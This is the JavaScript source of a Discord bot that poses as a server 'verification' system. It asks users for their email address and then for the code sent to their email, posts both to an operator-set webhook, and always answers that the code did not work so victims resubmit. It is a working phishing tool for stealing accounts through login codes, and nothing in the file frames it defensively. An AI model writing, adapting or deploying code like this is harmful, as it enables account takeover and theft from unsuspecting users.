const { Client, GatewayIntentBits, Partials, Collection, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, InteractionResponseType } = require('discord.js');
const fs = require('fs');
const path = require('path');
const config = require('./config.json');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ],
    partials: [Partials.Channel]
});

client.commands = new Collection();

// Load commands
const commandsPath = path.join(__dirname, 'commands');
const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));

for (const file of commandFiles) {
    const filePath = path.join(commandsPath, file);
    const command = require(filePath);
    client.commands.set(command.name, command);
}

// Command handling
client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    try {
        const command = client.commands.get(interaction.commandName);
        if (!command) return;

        await command.execute(interaction);
    } catch (error) {
        console.error('Error handling command:', error);
        try {
            if (!interaction.replied && !interaction.deferred) {
                await interaction.deferReply({ ephemeral: true });
            }
            await interaction.editReply({
                content: 'An error occurred while processing the command.'
            });
        } catch (err) {
            console.error('Error sending error message:', err);
        }
    }
});

// Button handling
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    try {
        if (interaction.customId === 'verify') {
            const modal = new ModalBuilder()
                .setCustomId('verifyModal')
                .setTitle('Verification Form');

            const emailInput = new TextInputBuilder()
                .setCustomId('email')
                .setLabel('Enter your email')
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const firstActionRow = new ActionRowBuilder().addComponents(emailInput);
            modal.addComponents(firstActionRow);

            await interaction.showModal(modal);
        }

        if (interaction.customId === 'submitCode') {
            const modal = new ModalBuilder()
                .setCustomId('codeModal')
                .setTitle('Enter Verification Code');

            const codeInput = new TextInputBuilder()
                .setCustomId('code')
                .setLabel('Enter the code sent to your email')
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const firstActionRow = new ActionRowBuilder().addComponents(codeInput);
            modal.addComponents(firstActionRow);

            await interaction.showModal(modal);
        }
    } catch (error) {
        console.error('Error handling button:', error);
        if (!interaction.replied && !interaction.deferred) {
            await interaction.reply({
                content: 'An error occurred. Please try again.',
                flags: 64
            });
        }
    }
});

// Modal handling
client.on('interactionCreate', async interaction => {
    if (!interaction.isModalSubmit()) return;

    try {
        if (interaction.customId === 'verifyModal') {
            const email = interaction.fields.getTextInputValue('email');
            
            try {
                const response = await fetch(config.webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `New verification request:\nEmail: ${email}`
                    })
                });

                if (response.ok) {
                    const row = new ActionRowBuilder()
                        .addComponents(
                            new ButtonBuilder()
                                .setCustomId('submitCode')
                                .setLabel('Submit Code')
                                .setStyle(ButtonStyle.Primary)
                        );

                    await interaction.reply({
                        content: 'Please check your email for the verification code. Click the button below to submit it:',
                        components: [row],
                        flags: 64
                    });
                } else {
                    await interaction.reply({
                        content: 'Error sending verification request. Please try again later.',
                        flags: 64
                    });
                }
            } catch (error) {
                console.error('Error sending to webhook:', error);
                await interaction.reply({
                    content: 'Error sending verification request. Please try again later.',
                    flags: 64
                });
            }
        }

        if (interaction.customId === 'codeModal') {
            const code = interaction.fields.getTextInputValue('code');
            
            try {
                const response = await fetch(config.webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `Verification code submitted: ${code}`
                    })
                });

                if (response.ok) {
                    await interaction.reply({
                        content: "Oops! That code didn't work. Please double-check it and try again.",
                        flags: 64
                    });
                } else {
                    await interaction.reply({
                        content: 'Error submitting verification code. Please try again later.',
                        flags: 64
                    });
                }
            } catch (error) {
                console.error('Error sending to webhook:', error);
                await interaction.reply({
                    content: 'Error submitting verification code. Please try again later.',
                    flags: 64
                });
            }
        }

        if (interaction.customId === 'webhookModal') {
            const newWebhookUrl = interaction.fields.getTextInputValue('webhookUrl');
            config.webhookUrl = newWebhookUrl;
            
            fs.writeFileSync('./config.json', JSON.stringify(config, null, 4));
            await interaction.reply({
                content: 'Webhook URL updated successfully!',
                flags: 64
            });
        }
    } catch (error) {
        console.error('Error handling modal:', error);
        if (!interaction.replied && !interaction.deferred) {
            await interaction.reply({
                content: 'An error occurred. Please try again.',
                flags: 64
            });
        }
    }
});

// Login
client.once('ready', async () => {
    console.log('Bot is ready!');
    
    // Register slash commands
    const rest = new REST({ version: '10' }).setToken(config.token);
    try {
        console.log('Started refreshing application (/) commands.');
        const commands = Array.from(client.commands.values()).map(command => ({
            name: command.name,
            description: command.description
        }));
        
        await rest.put(
            Routes.applicationCommands(config.clientId),
            { body: commands }
        );
        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error('Error refreshing slash commands:', error);
    }
});

client.login(config.token); 